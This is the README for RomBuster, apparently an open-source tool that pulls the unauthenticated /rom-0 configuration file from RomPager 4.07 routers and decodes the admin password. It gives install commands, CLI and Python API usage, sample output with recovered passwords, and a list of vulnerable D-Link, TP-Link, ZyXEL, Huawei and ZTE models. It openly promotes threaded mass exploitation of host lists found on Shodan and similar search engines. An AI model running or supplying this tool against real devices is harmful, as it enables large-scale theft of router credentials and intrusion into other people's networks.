# RomBuster

RomBuster is a RomPager exploitation tool that allows to disclosure network device admin password or perform DoS attack on device.

## Features

* Exploits vulnerabilities in most popular router models with RomPager installation such as `D-Link`, `Zyxel`, `TP-Link` and `Huawei`.
* Optimized to exploit multiple routers at one time from list with threading enabled.
* Simple CLI and API usage.

## Installation

```shell
pip3 install git+https://github.com/EntySec/RomBuster
```

## Basic usage

To use RomBuster just type `rombuster` in your terminal.

```
usage: rombuster [-h] [--threads] [--output OUTPUT] [--input INPUT] [--address ADDRESS]

RomBuster is a RomPager exploitation tool that allows to disclosure network device admin password or perform DoS attack on device.

optional arguments:
  -h, --help         show this help message and exit
  --threads          Use threads for fastest work.
  --output OUTPUT    Output result to file.
  --input INPUT      Input file of addresses.
  --address ADDRESS  Single address.
```

### Examples

Let's hack my router just for fun.

```shell
rombuster --address 192.168.2.1
```

**output:**

```shell
[*] (192.168.2.1) - connecting to device...
[*] (192.168.2.1) - accessing device rom...
[*] (192.168.2.1) - extracting admin password...
[i] (192.168.2.1) - password: SuperHardPassword999
```

Let's try to use opened database of hosts with `--threads` for fast exploitation.

```shell
rombuster --threads --input routers.txt --output passwords.txt
```

It will exploit all devices in `routers.txt` list by their addresses and save all obtained passwords to `passwords.txt`.

**output:**

```shell
[*] Initializing thread #0...
[*] (x.x.x.x) - connecting to device...
[*] Initializing thread #1...
[*] (x.x.x.x) - connecting to device...
[*] Initializing thread #2...
[*] (x.x.x.x) - connecting to device...
[*] (x.x.x.x) - accessing device rom...
[*] (x.x.x.x) - extracting admin password...
[i] Thread #0 completed.
[*] (x.x.x.x) - connecting to device...
[*] (x.x.x.x) - accessing device rom...
[*] (x.x.x.x) - extracting admin password...
[i] Thread #1 completed.
[*] (x.x.x.x) - connecting to device...
[*] (x.x.x.x) - accessing device rom...
[*] (x.x.x.x) - extracting admin password...
[i] Thread #2 completed.
```

## RomBuster API

RomBuster also has their own Python API that can be invoked by importing RomBuster to your code:

```python
from rombuster import RomBuster
```

### Basic functions

There are all RomBuster basic functions that can be used to exploit specified device.

* `connect(host)` - Connect specified defice by netword address.
* `exploit(device)` - Exploit connected device.

### Examples

```python
from rombuster import RomBuster

rombuster = RomBuster()

device = rombuster.connect('192.168.2.1')
print(rombuster.exploit(device))
```

**output:**

```shell
{'admin': 'SuperHardPassword999'}
```

## Vulnerability details

Vulnerability that exploits **RomBuster** exists nowadays in some popular routers all over the world. This vulnerability allows you to download `/rom-0` RomPager configuration file without authentication. **RomBuster** downloads this file, decodes it and giving you password of the router `admin`. Pretty easy way to access main network interface - router.

**Vulnerable RomPager versions:**

* **RomPager/4.07**

**Vulnerable devices:**

* **AirLive WT-2000ARM**
* **D-Link DSL-2520U**
* **D-Link DSL-2640R**
* **D-Link DSL-2740R**
* **Huawei 520 HG**
* **Huawei 530 TRA**
* **Pentagram Cerberus P 6331-42**
* **TP-Link TD-8816**
* **TP-Link TD-8817**
* **TP-LINK TD-8840T**
* **TP-Link TD-W8901G**
* **TP-Link TD-W8951ND**
* **TP-Link TD-W8961ND**
* **ZTE ZXV10 W300**
* **ZTE ZXDSL 831CII**
* **ZynOS**
* **ZyXEL ES-2024**
* **ZyXEL Prestige P-2602HW**
* **ZyXEL Prestige 782R**

**NOTE:** All these devices still online and can be found at `Shodan`, `Censys` or `Zoomeye`, that means that vulnerability is not completely patched (very sad).
